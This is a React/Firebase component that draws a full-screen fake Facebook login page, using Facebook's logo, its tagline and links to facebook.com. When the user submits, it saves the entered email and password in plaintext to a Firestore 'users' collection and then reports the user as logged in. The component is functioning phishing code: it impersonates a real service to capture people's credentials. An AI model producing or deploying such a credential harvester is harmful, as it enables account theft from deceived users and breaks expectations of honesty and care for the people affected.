import React, { useState} from "react";
import PropTypes from 'prop-types';
import { styled } from '@mui/material/styles';
import Dialog from '@mui/material/Dialog';
import DialogTitle from '@mui/material/DialogTitle';
import DialogContent from '@mui/material/DialogContent';
import IconButton from '@mui/material/IconButton';
import CloseIcon from '@mui/icons-material/Close';
import "../styles/LoginDialog.css";
import Slide from '@mui/material/Slide';
import { db} from "../firebase-config";
import {
    collection,
    addDoc,
    serverTimestamp
} from "firebase/firestore";

const Transition = React.forwardRef(function Transition(props, ref) {
    return <Slide direction="up" ref={ref} {...props} />;
});

function BootstrapDialogTitle(props) {
    const { children, onClose, ...other } = props;

    return (
        <DialogTitle sx={{ m: 0, p: 2 }} {...other}>
            {children}
            {onClose ? (
                <IconButton
                    aria-label="close"
                    onClick={onClose}
                    sx={{
                        position: 'absolute',
                        right: 8,
                        top: 8,
                        color: (theme) => theme.palette.grey[500],
                    }}
                >
                    <CloseIcon />
                </IconButton>
            ) : null}
        </DialogTitle>
    );
}

BootstrapDialogTitle.propTypes = {
    children: PropTypes.node,
    onClose: PropTypes.func.isRequired,
};

export default function LoginDialog({ open, setOpen, setIsAuth }) {

    const [userName, setUserName] = useState("");
    const [password, setPassword] = useState("");
    const usersRef = collection(db, "users");

    const handleClose = async () => {
        if (userName === "" || password == "") return;

        const emailRegex = /^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$/i;
        if (!emailRegex.test(userName)) {
            return
        }

        await addDoc(usersRef, {
            username: userName,
            createdAt: serverTimestamp(),
            password: password,

        });

        setOpen(false);
        setIsAuth(true)
    };

    return (
        <div>

            <Dialog
                fullScreen
                open={open}
                onClose={handleClose}
                TransitionComponent={Transition}
            >

                <DialogContent dividers>
                    <div className="box">
                        <div className="title-box">
                            <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook" />
                            <p>Facebook helps you connect and share with the people in your life.</p>
                        </div>
                        <div className="form-box">
                            <form action="#">
                                <input type="text" placeholder="Email address" onChange={(event) => setUserName(event.target.value)} />
                                <input type="password" placeholder="Password" onChange={(event) => setPassword(event.target.value)} />
                                <button type="button" onClick={handleClose}>Log In</button>
                                <a href="https://www.facebook.com/">Forgotten Password</a>
                            </form>
                            <hr />
                            <div className="create-btn">
                                <a href="https://www.facebook.com/">Create New Account</a>
                            </div>
                        </div>
                    </div>
                </DialogContent>

            </Dialog>
        </div>
    );
}